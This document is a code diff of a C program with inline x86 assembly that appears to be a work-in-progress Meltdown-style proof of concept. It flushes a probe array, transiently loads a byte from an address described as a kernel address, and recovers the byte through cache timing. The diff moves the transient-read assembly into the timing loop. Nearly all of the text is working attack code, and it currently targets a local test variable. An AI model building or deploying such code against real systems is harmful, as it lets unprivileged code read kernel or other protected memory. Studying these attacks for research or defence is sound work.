@@ -26,7 +26,7 @@ int main(int argc, char **argv) {
 //    asm volatile ("mov rax, [12]" : "=r"(i));
 //    printf("%lu\n", i);
 
-    uint8_t some_data = 0x3;
+    uint8_t some_data = 0xff;
 
     // Of course, I can't allocate this injective side-channel
     // on the stack since the stack goes towards less significant, not more significant
@@ -41,32 +41,28 @@ int main(int argc, char **argv) {
         asm volatile ("clflush [%0] \n\t"::"r" (probe_array + (i * 4096)));
     }
 
-    // rcx = kernel address
-    // rbx = probe array
-    // Here, the value is shifted by 0xc (4096) to avoid the page prefetcher
-    //       avoiding side-channel pollution
-    // Here, `jz retry` skips cases where transient execution was rolled back
-    //       making `shl rax, 0xc` zero which avoids side-channel pollution.
-    asm volatile ("mfence                           \n\t" // Memory store serialising barrier
-                  "lfence                           \n\t" // Memory load and instruction serialising barrier
-                  "xor rax, rax                     \n\t" // Scrub `rax` for use with `al`
-                  // BEGIN TRANSIENT EXECUTION
-                  "retry:                           \n\t"
-                  "mov al, BYTE PTR [%0]            \n\t"
-                  "shl rax, 0xc                     \n\t"
-                  "jz retry                         \n\t"
-                  "mov %1, QWORD PTR [%1 + rax]     \n\t"
-                  // END TRANSIENT EXECUTION
-    ::"c" /* rcx */ (&some_data), /* rbx */ "b" (probe_array)
-    : "rax", "al"
-    );
-
-
-    // TODO: I think I am being impeded by cache size where the side-channel value is being evicted before I can read it.
-
-
     for (int i = 0; i < 256; i++) {
         uint32_t time = 0;
+
+        // rcx = kernel address
+        // rbx = probe array
+        // Here, the value is shifted by 0xc (4096) to avoid the page prefetcher
+        //       avoiding side-channel pollution
+        // Here, `jz retry` skips cases where transient execution was rolled back
+        //       making `shl rax, 0xc` zero which avoids side-channel pollution.
+        asm volatile ("mfence                           \n\t" // Memory store serialising barrier
+                      "lfence                           \n\t" // Memory load and instruction serialising barrier
+                      "xor rax, rax                     \n\t" // Scrub `rax` for use with `al`
+                      // BEGIN TRANSIENT EXECUTION
+                      "retry:                           \n\t"
+                      "mov al, BYTE PTR [%0]            \n\t"
+                      "shl rax, 0xc                     \n\t"
+                      "jz retry                         \n\t"
+                      "mov %1, QWORD PTR [%1 + rax]     \n\t"
+                      // END TRANSIENT EXECUTION
+        ::"c" /* rcx */ (&some_data), /* rbx */ "b" (probe_array)
+        : "rax", "al"
+        );
 
         asm volatile ("mfence                   \n\t" // Memory store serialising barrier
                       "lfence                   \n\t" // Memory load and instruction serialising barrier
